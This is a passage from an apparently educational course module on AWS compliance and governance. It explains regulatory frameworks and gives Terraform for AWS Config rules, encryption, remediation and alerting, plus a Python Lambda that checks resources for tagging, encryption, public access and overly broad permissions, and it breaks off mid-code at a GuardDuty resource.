# Module 09: Compliance → Governance Frameworks

## 📚 Learning Objectives

By the end of this module, you will be able to:

- **Implement Policy as Code**: Design and deploy governance policies using AWS Config, Open Policy Agent (OPA), and HashiCorp Sentinel
- **Build Compliance Automation**: Create automated compliance scanning, validation, and remediation systems for regulatory requirements
- **Establish Governance Frameworks**: Implement enterprise governance patterns including access controls, audit trails, and policy enforcement
- **Deploy Security Controls**: Build comprehensive security controls for data protection, access management, and threat detection
- **Create Audit and Reporting Systems**: Implement automated audit trails, compliance reporting, and evidence collection systems
- **Apply Software Quality Patterns**: Connect infrastructure compliance to software engineering practices like code review, testing, and quality gates
- **Implement Regulatory Compliance**: Address specific compliance requirements for SOC 2, PCI DSS, HIPAA, and GDPR
- **Design Zero-Trust Architecture**: Implement identity-based security models with continuous verification and least privilege access

## 🎯 Overview

Compliance and governance in infrastructure is fundamentally about building systems that can demonstrate security, reliability, and adherence to standards, much like how software engineering implements code quality, testing, and deployment standards. This module explores how infrastructure governance patterns mirror software development lifecycle practices and how proper compliance frameworks enable trustworthy, auditable systems.

Just as software engineers implement code reviews, automated testing, and continuous integration to ensure quality and security, infrastructure engineers must implement governance frameworks that provide continuous compliance monitoring, policy enforcement, and audit capabilities. Understanding these patterns is crucial for building enterprise-ready systems that meet regulatory requirements and organizational standards.

## 📖 Core Concepts

### Governance Framework Components

#### Policy as Code
- **Infrastructure Policies**: Rules for resource configuration and compliance
- **Security Policies**: Access controls, encryption, and security standards
- **Operational Policies**: Backup, monitoring, and operational procedures
- **Cost Policies**: Resource optimization and budget controls

#### Compliance Domains
- **Data Protection**: Encryption, data classification, privacy controls
- **Access Management**: Identity, authentication, authorization
- **Audit and Logging**: Trail preservation, log integrity, retention
- **Risk Management**: Vulnerability assessment, threat detection
- **Change Management**: Controlled deployments, rollback procedures

### Software Engineering Parallels

| Infrastructure Governance | Software Engineering Practice | Purpose |
|---------------------------|-------------------------------|---------|
| Policy as Code | Code Review and Linting | Enforce standards and prevent issues |
| Compliance Scanning | Automated Testing | Validate adherence to requirements |
| Audit Trails | Version Control History | Track changes and maintain accountability |
| Access Controls | Authentication/Authorization | Secure resource access |
| Security Controls | Security Testing (SAST/DAST) | Identify and prevent vulnerabilities |
| Governance Gates | CI/CD Quality Gates | Prevent non-compliant deployments |

### Regulatory Compliance Frameworks

#### SOC 2 (System and Organization Controls)
- **Security**: Protection against unauthorized access
- **Availability**: System operational availability
- **Processing Integrity**: System processing accuracy
- **Confidentiality**: Information protection
- **Privacy**: Personal information collection and handling

#### PCI DSS (Payment Card Industry Data Security Standard)
- **Network Security**: Firewall configuration and network segmentation
- **Data Protection**: Cardholder data encryption and access controls
- **Vulnerability Management**: Security testing and monitoring
- **Access Controls**: User authentication and authorization
- **Monitoring**: Network monitoring and log analysis

#### HIPAA (Health Insurance Portability and Accountability Act)
- **Administrative Safeguards**: Policies and procedures
- **Physical Safeguards**: Physical access controls
- **Technical Safeguards**: Data encryption and access controls
- **Breach Notification**: Incident response and reporting

#### GDPR (General Data Protection Regulation)
- **Data Protection by Design**: Privacy-first architecture
- **Data Subject Rights**: Access, rectification, erasure rights
- **Data Processing Records**: Audit trails and documentation
- **Privacy Impact Assessments**: Risk evaluation processes

### Governance Maturity Levels

#### Level 1: Basic Compliance
- **Manual Processes**: Ad-hoc compliance checking
- **Reactive Approach**: Address issues after they occur
- **Basic Documentation**: Manual audit trails

#### Level 2: Automated Compliance
- **Policy Automation**: Automated policy enforcement
- **Continuous Monitoring**: Real-time compliance checking
- **Automated Reporting**: Regular compliance dashboards

#### Level 3: Continuous Governance
- **Preventive Controls**: Block non-compliant deployments
- **Self-Healing**: Automatic remediation of violations
- **Predictive Analytics**: Risk-based compliance assessment

#### Level 4: Adaptive Governance
- **Machine Learning**: AI-driven policy optimization
- **Dynamic Policies**: Context-aware policy enforcement
- **Continuous Improvement**: Data-driven governance evolution

## 🛠️ Terraform Implementation

### 1. Policy as Code with AWS Config and OPA

This implementation creates a comprehensive governance framework using AWS Config and Open Policy Agent:

```hcl
# examples/01-policy-as-code/main.tf

terraform {
  required_version = ">= 1.5.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.aws_region
  
  default_tags {
    tags = {
      Project     = var.project_name
      Environment = var.environment
      ManagedBy   = "Terraform"
      Module      = "Policy-as-Code"
      Compliance  = "Required"
    }
  }
}

# Data sources
data "aws_caller_identity" "current" {}
data "aws_region" "current" {}
data "aws_partition" "current" {}

# S3 bucket for AWS Config
resource "aws_s3_bucket" "config" {
  bucket        = "${var.project_name}-${var.environment}-config-${random_string.bucket_suffix.result}"
  force_destroy = true

  tags = {
    Name    = "AWS Config Storage"
    Purpose = "Compliance Monitoring"
  }
}

resource "random_string" "bucket_suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "aws_s3_bucket_versioning" "config" {
  bucket = aws_s3_bucket.config.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "config" {
  bucket = aws_s3_bucket.config.id

  rule {
    apply_server_side_encryption_by_default {
      kms_master_key_id = aws_kms_key.config.arn
      sse_algorithm     = "aws:kms"
    }
    bucket_key_enabled = true
  }
}

resource "aws_s3_bucket_public_access_block" "config" {
  bucket = aws_s3_bucket.config.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# KMS key for Config encryption
resource "aws_kms_key" "config" {
  description             = "KMS key for AWS Config"
  deletion_window_in_days = 7
  enable_key_rotation     = true

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "Enable IAM User Permissions"
        Effect = "Allow"
        Principal = {
          AWS = "arn:${data.aws_partition.current.partition}:iam::${data.aws_caller_identity.current.account_id}:root"
        }
        Action   = "kms:*"
        Resource = "*"
      },
      {
        Sid    = "Allow Config Service"
        Effect = "Allow"
        Principal = {
          Service = "config.amazonaws.com"
        }
        Action = [
          "kms:Decrypt",
          "kms:GenerateDataKey*"
        ]
        Resource = "*"
      }
    ]
  })

  tags = {
    Name = "${var.project_name}-${var.environment}-config-kms"
  }
}

resource "aws_kms_alias" "config" {
  name          = "alias/${var.project_name}-${var.environment}-config"
  target_key_id = aws_kms_key.config.key_id
}

# S3 bucket policy for Config
resource "aws_s3_bucket_policy" "config" {
  bucket = aws_s3_bucket.config.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AWSConfigBucketPermissionsCheck"
        Effect = "Allow"
        Principal = {
          Service = "config.amazonaws.com"
        }
        Action   = "s3:GetBucketAcl"
        Resource = aws_s3_bucket.config.arn
      },
      {
        Sid    = "AWSConfigBucketExistenceCheck"
        Effect = "Allow"
        Principal = {
          Service = "config.amazonaws.com"
        }
        Action   = "s3:ListBucket"
        Resource = aws_s3_bucket.config.arn
      },
      {
        Sid    = "AWSConfigBucketDelivery"
        Effect = "Allow"
        Principal = {
          Service = "config.amazonaws.com"
        }
        Action   = "s3:PutObject"
        Resource = "${aws_s3_bucket.config.arn}/*"
        Condition = {
          StringEquals = {
            "s3:x-amz-acl" = "bucket-owner-full-control"
          }
        }
      }
    ]
  })
}

# IAM role for AWS Config
resource "aws_iam_role" "config" {
  name = "${var.project_name}-${var.environment}-config-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "config.amazonaws.com"
        }
      }
    ]
  })

  tags = {
    Name = "${var.project_name}-${var.environment}-config-role"
  }
}

resource "aws_iam_role_policy_attachment" "config" {
  role       = aws_iam_role.config.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/ConfigRole"
}

# AWS Config Configuration Recorder
resource "aws_config_configuration_recorder" "main" {
  name     = "${var.project_name}-${var.environment}-recorder"
  role_arn = aws_iam_role.config.arn

  recording_group {
    all_supported = true
    include_global_resource_types = true
    
    # Record all resource types for comprehensive governance
    recording_mode {
      recording_frequency                 = "CONTINUOUS"
      recording_mode_override {
        resource_types                    = ["AWS::IAM::Role", "AWS::IAM::Policy"]
        recording_frequency              = "DAILY"
      }
    }
  }

  depends_on = [aws_config_delivery_channel.main]
}

# AWS Config Delivery Channel
resource "aws_config_delivery_channel" "main" {
  name           = "${var.project_name}-${var.environment}-delivery-channel"
  s3_bucket_name = aws_s3_bucket.config.bucket
  s3_key_prefix  = "config"
  
  # Delivery properties for compliance reporting
  snapshot_delivery_properties {
    delivery_frequency = "TwentyFour_Hours"
  }
}

# AWS Config Rules for Compliance

# Security Group Rules
resource "aws_config_config_rule" "security_group_ssh_check" {
  name = "security-group-ssh-check"

  source {
    owner             = "AWS"
    source_identifier = "INCOMING_SSH_DISABLED"
  }

  depends_on = [aws_config_configuration_recorder.main]

  tags = {
    Name       = "SSH Access Check"
    Compliance = "Security"
  }
}

resource "aws_config_config_rule" "security_group_unrestricted_access" {
  name = "security-group-unrestricted-access-check"

  source {
    owner             = "AWS"
    source_identifier = "EC2_SECURITY_GROUP_ATTACHED_TO_ENI"
  }

  depends_on = [aws_config_configuration_recorder.main]

  tags = {
    Name       = "Unrestricted Access Check"
    Compliance = "Security"
  }
}

# Encryption Rules
resource "aws_config_config_rule" "s3_bucket_server_side_encryption" {
  name = "s3-bucket-server-side-encryption-enabled"

  source {
    owner             = "AWS"
    source_identifier = "S3_BUCKET_SERVER_SIDE_ENCRYPTION_ENABLED"
  }

  depends_on = [aws_config_configuration_recorder.main]

  tags = {
    Name       = "S3 Encryption Check"
    Compliance = "DataProtection"
  }
}

resource "aws_config_config_rule" "rds_storage_encrypted" {
  name = "rds-storage-encrypted"

  source {
    owner             = "AWS"
    source_identifier = "RDS_STORAGE_ENCRYPTED"
  }

  depends_on = [aws_config_configuration_recorder.main]

  tags = {
    Name       = "RDS Encryption Check"
    Compliance = "DataProtection"
  }
}

# Access Control Rules
resource "aws_config_config_rule" "iam_password_policy" {
  name = "iam-password-policy"

  source {
    owner             = "AWS"
    source_identifier = "IAM_PASSWORD_POLICY"
  }

  input_parameters = jsonencode({
    RequireUppercaseCharacters = "true"
    RequireLowercaseCharacters = "true"
    RequireSymbols            = "true"
    RequireNumbers            = "true"
    MinimumPasswordLength     = "14"
    PasswordReusePrevention   = "12"
    MaxPasswordAge            = "90"
  })

  depends_on = [aws_config_configuration_recorder.main]

  tags = {
    Name       = "IAM Password Policy"
    Compliance = "AccessControl"
  }
}

resource "aws_config_config_rule" "iam_user_mfa_enabled" {
  name = "iam-user-mfa-enabled"

  source {
    owner             = "AWS"
    source_identifier = "IAM_USER_MFA_ENABLED"
  }

  depends_on = [aws_config_configuration_recorder.main]

  tags = {
    Name       = "MFA Required"
    Compliance = "AccessControl"
  }
}

# Custom Config Rule using Lambda
resource "aws_lambda_function" "custom_compliance_rule" {
  filename         = "custom_compliance_rule.zip"
  function_name    = "${var.project_name}-${var.environment}-custom-compliance-rule"
  role            = aws_iam_role.lambda_config_rule.arn
  handler         = "index.handler"
  runtime         = "python3.9"
  timeout         = 60

  source_code_hash = data.archive_file.custom_compliance_rule.output_base64sha256

  environment {
    variables = {
      PROJECT_NAME = var.project_name
      ENVIRONMENT  = var.environment
    }
  }

  tags = {
    Name = "${var.project_name}-${var.environment}-custom-compliance-rule"
  }
}

data "archive_file" "custom_compliance_rule" {
  type        = "zip"
  output_path = "custom_compliance_rule.zip"
  
  source {
    content = templatefile("${path.module}/lambda/custom_compliance_rule.py", {
      project_name = var.project_name
      environment  = var.environment
    })
    filename = "index.py"
  }
}

# IAM role for Lambda Config rule
resource "aws_iam_role" "lambda_config_rule" {
  name = "${var.project_name}-${var.environment}-lambda-config-rule"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "lambda.amazonaws.com"
        }
      }
    ]
  })
}

resource "aws_iam_role_policy" "lambda_config_rule" {
  name = "${var.project_name}-${var.environment}-lambda-config-rule-policy"
  role = aws_iam_role.lambda_config_rule.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "logs:CreateLogGroup",
          "logs:CreateLogStream",
          "logs:PutLogEvents"
        ]
        Resource = "*"
      },
      {
        Effect = "Allow"
        Action = [
          "config:PutEvaluations",
          "config:GetComplianceDetailsByConfigRule",
          "config:GetComplianceDetailsByResource"
        ]
        Resource = "*"
      },
      {
        Effect = "Allow"
        Action = [
          "ec2:Describe*",
          "s3:Get*",
          "s3:List*",
          "rds:Describe*",
          "iam:Get*",
          "iam:List*"
        ]
        Resource = "*"
      }
    ]
  })
}

# Custom Config Rule for Resource Tagging
resource "aws_config_config_rule" "resource_tagging_compliance" {
  name = "resource-tagging-compliance"

  source {
    owner                = "AWS_LAMBDA"
    source_identifier   = aws_lambda_function.custom_compliance_rule.arn
    source_detail {
      event_source                = "aws.config"
      message_type               = "ConfigurationItemChangeNotification"
      maximum_execution_frequency = "TwentyFour_Hours"
    }
  }

  input_parameters = jsonencode({
    requiredTags = {
      Project     = var.project_name
      Environment = var.environment
      Owner       = "required"
      CostCenter  = "required"
    }
  })

  depends_on = [
    aws_config_configuration_recorder.main,
    aws_lambda_permission.config_rule
  ]

  tags = {
    Name       = "Resource Tagging Compliance"
    Compliance = "Governance"
  }
}

resource "aws_lambda_permission" "config_rule" {
  statement_id  = "AllowExecutionFromConfig"
  action        = "lambda:InvokeFunction"
  function_name = aws_lambda_function.custom_compliance_rule.function_name
  principal     = "config.amazonaws.com"
}

# Config Remediation Configuration
resource "aws_config_remediation_configuration" "s3_bucket_encryption" {
  config_rule_name = aws_config_config_rule.s3_bucket_server_side_encryption.name

  resource_type    = "AWS::S3::Bucket"
  target_type      = "SSM_DOCUMENT"
  target_id        = "AWSConfigRemediation-EnableS3BucketEncryption"
  target_version   = "1"

  parameter {
    name           = "AutomationAssumeRole"
    static_value   = aws_iam_role.remediation.arn
  }

  parameter {
    name             = "BucketName"
    resource_value   = "RESOURCE_ID"
  }

  parameter {
    name           = "KMSMasterKeyID"
    static_value   = aws_kms_key.config.arn
  }

  automatic                = var.enable_auto_remediation
  execution_controls {
    ssm_controls {
      concurrent_execution_rate_percentage = 25
      error_percentage                     = 20
    }
  }
}

# IAM role for remediation
resource "aws_iam_role" "remediation" {
  name = "${var.project_name}-${var.environment}-remediation-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "ssm.amazonaws.com"
        }
      }
    ]
  })
}

resource "aws_iam_role_policy" "remediation" {
  name = "${var.project_name}-${var.environment}-remediation-policy"
  role = aws_iam_role.remediation.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "s3:PutBucketEncryption",
          "s3:GetBucketEncryption"
        ]
        Resource = "*"
      },
      {
        Effect = "Allow"
        Action = [
          "kms:CreateGrant",
          "kms:Decrypt",
          "kms:GenerateDataKey*"
        ]
        Resource = aws_kms_key.config.arn
      }
    ]
  })
}

# CloudWatch Dashboard for Compliance Monitoring
resource "aws_cloudwatch_dashboard" "compliance" {
  dashboard_name = "${var.project_name}-${var.environment}-compliance"

  dashboard_body = jsonencode({
    widgets = [
      {
        type   = "metric"
        x      = 0
        y      = 0
        width  = 12
        height = 6

        properties = {
          metrics = [
            ["AWS/Config", "ComplianceByConfigRule", "RuleName", aws_config_config_rule.security_group_ssh_check.name, { "stat": "Average" }],
            ["...", aws_config_config_rule.s3_bucket_server_side_encryption.name, { "stat": "Average" }],
            ["...", aws_config_config_rule.rds_storage_encrypted.name, { "stat": "Average" }],
            ["...", aws_config_config_rule.iam_password_policy.name, { "stat": "Average" }]
          ]
          period = 3600
          stat   = "Average"
          region = var.aws_region
          title  = "Compliance Score by Rule"
          yAxis = {
            left = {
              min = 0
              max = 1
            }
          }
        }
      },
      {
        type   = "metric"
        x      = 12
        y      = 0
        width  = 12
        height = 6

        properties = {
          metrics = [
            ["AWS/Config", "ComplianceByConfigRule", { "stat": "Average" }]
          ]
          period = 3600
          stat   = "Average"
          region = var.aws_region
          title  = "Overall Compliance Trend"
        }
      }
    ]
  })
}

# SNS Topic for Compliance Alerts
resource "aws_sns_topic" "compliance_alerts" {
  name = "${var.project_name}-${var.environment}-compliance-alerts"

  tags = {
    Name = "${var.project_name}-${var.environment}-compliance-alerts"
  }
}

# EventBridge Rule for Config Rule Compliance State Changes
resource "aws_cloudwatch_event_rule" "config_compliance_change" {
  name        = "${var.project_name}-${var.environment}-config-compliance-change"
  description = "Capture Config rule compliance state changes"

  event_pattern = jsonencode({
    source      = ["aws.config"]
    detail-type = ["Config Rules Compliance Change"]
    detail = {
      newEvaluationResult = {
        complianceType = ["NON_COMPLIANT"]
      }
    }
  })

  tags = {
    Name = "${var.project_name}-${var.environment}-config-compliance-change"
  }
}

resource "aws_cloudwatch_event_target" "compliance_alert" {
  rule      = aws_cloudwatch_event_rule.config_compliance_change.name
  target_id = "ComplianceAlert"
  arn       = aws_sns_topic.compliance_alerts.arn
}

# Allow EventBridge to publish to SNS
resource "aws_sns_topic_policy" "compliance_alerts" {
  arn = aws_sns_topic.compliance_alerts.arn

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "events.amazonaws.com"
        }
        Action   = "sns:Publish"
        Resource = aws_sns_topic.compliance_alerts.arn
      }
    ]
  })
}
```

```python
# examples/01-policy-as-code/lambda/custom_compliance_rule.py

import json
import boto3
import logging
from datetime import datetime

# Configure logging
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# AWS clients
config_client = boto3.client('config')
ec2_client = boto3.client('ec2')
s3_client = boto3.client('s3')
rds_client = boto3.client('rds')
iam_client = boto3.client('iam')

def handler(event, context):
    """
    Custom AWS Config rule for comprehensive compliance checking
    """
    try:
        logger.info(f"Config rule evaluation triggered: {json.dumps(event)}")
        
        # Parse the Config rule invocation
        invoking_event = json.loads(event['invokingEvent'])
        rule_parameters = json.loads(event.get('ruleParameters', '{}'))
        
        # Get the configuration item that triggered the evaluation
        configuration_item = invoking_event.get('configurationItem')
        
        if not configuration_item:
            logger.error("No configuration item found in event")
            return
        
        # Evaluate compliance based on resource type
        evaluations = []
        resource_type = configuration_item['resourceType']
        resource_id = configuration_item['resourceId']
        
        if resource_type == 'AWS::EC2::Instance':
            evaluations.extend(evaluate_ec2_instance(configuration_item, rule_parameters))
        elif resource_type == 'AWS::S3::Bucket':
            evaluations.extend(evaluate_s3_bucket(configuration_item, rule_parameters))
        elif resource_type == 'AWS::RDS::DBCluster':
            evaluations.extend(evaluate_rds_cluster(configuration_item, rule_parameters))
        elif resource_type == 'AWS::IAM::Role':
            evaluations.extend(evaluate_iam_role(configuration_item, rule_parameters))
        else:
            # Generic resource evaluation (mainly for tagging)
            evaluations.extend(evaluate_resource_tagging(configuration_item, rule_parameters))
        
        # Submit evaluations to AWS Config
        if evaluations:
            response = config_client.put_evaluations(
                Evaluations=evaluations,
                ResultToken=event['resultToken']
            )
            logger.info(f"Submitted {len(evaluations)} evaluations")
        
        return {
            'statusCode': 200,
            'body': json.dumps(f'Successfully evaluated {len(evaluations)} compliance checks')
        }
    
    except Exception as e:
        logger.error(f"Error in compliance evaluation: {str(e)}")
        
        # Submit a non-compliant evaluation for the resource
        try:
            config_client.put_evaluations(
                Evaluations=[
                    {
                        'ComplianceResourceType': event.get('configurationItem', {}).get('resourceType', 'Unknown'),
                        'ComplianceResourceId': event.get('configurationItem', {}).get('resourceId', 'Unknown'),
                        'ComplianceType': 'NOT_APPLICABLE',
                        'Annotation': f'Evaluation error: {str(e)}',
                        'OrderingTimestamp': datetime.utcnow()
                    }
                ],
                ResultToken=event.get('resultToken', '')
            )
        except Exception as submit_error:
            logger.error(f"Error submitting evaluation: {str(submit_error)}")
        
        return {
            'statusCode': 500,
            'body': json.dumps(f'Error: {str(e)}')
        }

def evaluate_ec2_instance(configuration_item, rule_parameters):
    """Evaluate EC2 instance compliance"""
    evaluations = []
    resource_id = configuration_item['resourceId']
    config = configuration_item.get('configuration', {})
    
    # Check if instance has required tags
    tags_evaluation = check_required_tags(
        config.get('tags', {}), 
        rule_parameters.get('requiredTags', {})
    )
    
    evaluations.append({
        'ComplianceResourceType': 'AWS::EC2::Instance',
        'ComplianceResourceId': resource_id,
        'ComplianceType': tags_evaluation['compliance'],
        'Annotation': tags_evaluation['annotation'],
        'OrderingTimestamp': datetime.utcnow()
    })
    
    # Check if instance is using approved AMI
    ami_id = config.get('imageId')
    if ami_id:
        approved_amis = rule_parameters.get('approvedAmis', [])
        ami_compliance = 'COMPLIANT' if not approved_amis or ami_id in approved_amis else 'NON_COMPLIANT'
        ami_annotation = f"AMI {ami_id} {'is approved' if ami_compliance == 'COMPLIANT' else 'is not in approved list'}"
        
        evaluations.append({
            'ComplianceResourceType': 'AWS::EC2::Instance',
            'ComplianceResourceId': resource_id,
            'ComplianceType': ami_compliance,
            'Annotation': ami_annotation,
            'OrderingTimestamp': datetime.utcnow()
        })
    
    # Check security groups for overly permissive rules
    security_groups = config.get('securityGroups', [])
    for sg in security_groups:
        sg_evaluation = evaluate_security_group_rules(sg.get('groupId'))
        if sg_evaluation:
            evaluations.append({
                'ComplianceResourceType': 'AWS::EC2::SecurityGroup',
                'ComplianceResourceId': sg.get('groupId'),
                'ComplianceType': sg_evaluation['compliance'],
                'Annotation': sg_evaluation['annotation'],
                'OrderingTimestamp': datetime.utcnow()
            })
    
    return evaluations

def evaluate_s3_bucket(configuration_item, rule_parameters):
    """Evaluate S3 bucket compliance"""
    evaluations = []
    resource_id = configuration_item['resourceId']
    
    # Check bucket encryption
    try:
        encryption_response = s3_client.get_bucket_encryption(Bucket=resource_id)
        encryption_rules = encryption_response.get('ServerSideEncryptionConfiguration', {}).get('Rules', [])
        
        has_encryption = any(
            rule.get('ApplyServerSideEncryptionByDefault', {}).get('SSEAlgorithm') in ['AES256', 'aws:kms']
            for rule in encryption_rules
        )
        
        encryption_compliance = 'COMPLIANT' if has_encryption else 'NON_COMPLIANT'
        encryption_annotation = f"Bucket encryption {'enabled' if has_encryption else 'not enabled'}"
        
    except Exception as e:
        encryption_compliance = 'NON_COMPLIANT'
        encryption_annotation = f"Bucket encryption not configured: {str(e)}"
    
    evaluations.append({
        'ComplianceResourceType': 'AWS::S3::Bucket',
        'ComplianceResourceId': resource_id,
        'ComplianceType': encryption_compliance,
        'Annotation': encryption_annotation,
        'OrderingTimestamp': datetime.utcnow()
    })
    
    # Check public access settings
    try:
        public_access_response = s3_client.get_public_access_block(Bucket=resource_id)
        public_access_config = public_access_response.get('PublicAccessBlockConfiguration', {})
        
        is_properly_blocked = all([
            public_access_config.get('BlockPublicAcls', False),
            public_access_config.get('IgnorePublicAcls', False),
            public_access_config.get('BlockPublicPolicy', False),
            public_access_config.get('RestrictPublicBuckets', False)
        ])
        
        public_access_compliance = 'COMPLIANT' if is_properly_blocked else 'NON_COMPLIANT'
        public_access_annotation = f"Public access {'properly blocked' if is_properly_blocked else 'not fully blocked'}"
        
    except Exception as e:
        public_access_compliance = 'NON_COMPLIANT'
        public_access_annotation = f"Public access block not configured: {str(e)}"
    
    evaluations.append({
        'ComplianceResourceType': 'AWS::S3::Bucket',
        'ComplianceResourceId': resource_id,
        'ComplianceType': public_access_compliance,
        'Annotation': public_access_annotation,
        'OrderingTimestamp': datetime.utcnow()
    })
    
    return evaluations

def evaluate_rds_cluster(configuration_item, rule_parameters):
    """Evaluate RDS cluster compliance"""
    evaluations = []
    resource_id = configuration_item['resourceId']
    config = configuration_item.get('configuration', {})
    
    # Check encryption at rest
    storage_encrypted = config.get('storageEncrypted', False)
    encryption_compliance = 'COMPLIANT' if storage_encrypted else 'NON_COMPLIANT'
    encryption_annotation = f"Storage encryption {'enabled' if storage_encrypted else 'disabled'}"
    
    evaluations.append({
        'ComplianceResourceType': 'AWS::RDS::DBCluster',
        'ComplianceResourceId': resource_id,
        'ComplianceType': encryption_compliance,
        'Annotation': encryption_annotation,
        'OrderingTimestamp': datetime.utcnow()
    })
    
    # Check backup retention
    backup_retention_period = config.get('backupRetentionPeriod', 0)
    min_retention_days = rule_parameters.get('minBackupRetentionDays', 7)
    
    backup_compliance = 'COMPLIANT' if backup_retention_period >= min_retention_days else 'NON_COMPLIANT'
    backup_annotation = f"Backup retention {backup_retention_period} days ({'meets' if backup_compliance == 'COMPLIANT' else 'below'} minimum {min_retention_days})"
    
    evaluations.append({
        'ComplianceResourceType': 'AWS::RDS::DBCluster',
        'ComplianceResourceId': resource_id,
        'ComplianceType': backup_compliance,
        'Annotation': backup_annotation,
        'OrderingTimestamp': datetime.utcnow()
    })
    
    return evaluations

def evaluate_iam_role(configuration_item, rule_parameters):
    """Evaluate IAM role compliance"""
    evaluations = []
    resource_id = configuration_item['resourceId']
    config = configuration_item.get('configuration', {})
    
    # Check for overly permissive policies
    try:
        role_policies = iam_client.list_attached_role_policies(RoleName=resource_id)
        inline_policies = iam_client.list_role_policies(RoleName=resource_id)
        
        has_admin_access = False
        
        # Check attached policies
        for policy in role_policies.get('AttachedPolicies', []):
            if 'Administrator' in policy.get('PolicyName', '') or policy.get('PolicyArn', '').endswith('AdministratorAccess'):
                has_admin_access = True
                break
        
        # Check inline policies for broad permissions
        for policy_name in inline_policies.get('PolicyNames', []):
            policy_doc = iam_client.get_role_policy(RoleName=resource_id, PolicyName=policy_name)
            if check_broad_permissions(policy_doc.get('PolicyDocument', {})):
                has_admin_access = True
                break
        
        admin_compliance = 'NON_COMPLIANT' if has_admin_access else 'COMPLIANT'
        admin_annotation = f"Role {'has' if has_admin_access else 'does not have'} overly broad permissions"
        
        evaluations.append({
            'ComplianceResourceType': 'AWS::IAM::Role',
            'ComplianceResourceId': resource_id,
            'ComplianceType': admin_compliance,
            'Annotation': admin_annotation,
            'OrderingTimestamp': datetime.utcnow()
        })
        
    except Exception as e:
        logger.error(f"Error evaluating IAM role {resource_id}: {str(e)}")
    
    return evaluations

def evaluate_resource_tagging(configuration_item, rule_parameters):
    """Evaluate resource tagging compliance"""
    evaluations = []
    resource_type = configuration_item['resourceType']
    resource_id = configuration_item['resourceId']
    
    # Extract tags from configuration item
    tags = {}
    config = configuration_item.get('configuration', {})
    
    # Different resource types store tags differently
    if 'tags' in config:
        if isinstance(config['tags'], dict):
            tags = config['tags']
        elif isinstance(config['tags'], list):
            tags = {tag.get('key', ''): tag.get('value', '') for tag in config['tags']}
    
    # Check required tags
    required_tags = rule_parameters.get('requiredTags', {})
    tags_evaluation = check_required_tags(tags, required_tags)
    
    evaluations.append({
        'ComplianceResourceType': resource_type,
        'ComplianceResourceId': resource_id,
        'ComplianceType': tags_evaluation['compliance'],
        'Annotation': tags_evaluation['annotation'],
        'OrderingTimestamp': datetime.utcnow()
    })
    
    return evaluations

def check_required_tags(resource_tags, required_tags):
    """Check if resource has all required tags"""
    missing_tags = []
    
    for tag_key, tag_requirement in required_tags.items():
        if tag_requirement == 'required':
            if tag_key not in resource_tags or not resource_tags[tag_key].strip():
                missing_tags.append(tag_key)
        else:
            # Specific value required
            if tag_key not in resource_tags or resource_tags[tag_key] != tag_requirement:
                missing_tags.append(f"{tag_key}={tag_requirement}")
    
    if missing_tags:
        return {
            'compliance': 'NON_COMPLIANT',
            'annotation': f"Missing required tags: {', '.join(missing_tags)}"
        }
    else:
        return {
            'compliance': 'COMPLIANT',
            'annotation': 'All required tags present'
        }

def evaluate_security_group_rules(security_group_id):
    """Evaluate security group rules for overly permissive access"""
    try:
        response = ec2_client.describe_security_groups(GroupIds=[security_group_id])
        security_groups = response.get('SecurityGroups', [])
        
        if not security_groups:
            return None
        
        sg = security_groups[0]
        ingress_rules = sg.get('IpPermissions', [])
        
        # Check for overly permissive rules (0.0.0.0/0 access)
        risky_rules = []
        for rule in ingress_rules:
            for ip_range in rule.get('IpRanges', []):
                if ip_range.get('CidrIp') == '0.0.0.0/0':
                    from_port = rule.get('FromPort', 'All')
                    to_port = rule.get('ToPort', 'All')
                    protocol = rule.get('IpProtocol', 'All')
                    risky_rules.append(f"{protocol}:{from_port}-{to_port}")
        
        if risky_rules:
            return {
                'compliance': 'NON_COMPLIANT',
                'annotation': f"Overly permissive rules allowing 0.0.0.0/0 access: {', '.join(risky_rules)}"
            }
        else:
            return {
                'compliance': 'COMPLIANT',
                'annotation': 'No overly permissive rules detected'
            }
    
    except Exception as e:
        logger.error(f"Error evaluating security group {security_group_id}: {str(e)}")
        return None

def check_broad_permissions(policy_document):
    """Check if policy document contains overly broad permissions"""
    statements = policy_document.get('Statement', [])
    if not isinstance(statements, list):
        statements = [statements]
    
    for statement in statements:
        if statement.get('Effect') == 'Allow':
            actions = statement.get('Action', [])
            if not isinstance(actions, list):
                actions = [actions]
            
            # Check for wildcard actions or resources
            if any('*' == action for action in actions):
                resources = statement.get('Resource', [])
                if not isinstance(resources, list):
                    resources = [resources]
                
                if any('*' == resource for resource in resources):
                    return True
    
    return False
```

### 2. Security Controls Implementation

```hcl
# examples/02-security-controls/main.tf

terraform {
  required_version = ">= 1.5.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.aws_region
  
  default_tags {
    tags = {
      Project     = var.project_name
      Environment = var.environment
      ManagedBy   = "Terraform"
      Module      = "Security-Controls"
      Compliance  = "Required"
    }
  }
}

# Data sources
data "aws_caller_identity" "current" {}
data "aws_organizations_organization" "current" {
  count = var.enable_organizations ? 1 : 0
}

# AWS GuardDuty for threat detection
resource "aws_guardduty_detector" "main" {
  enable = true
  
  # Enhanced security features
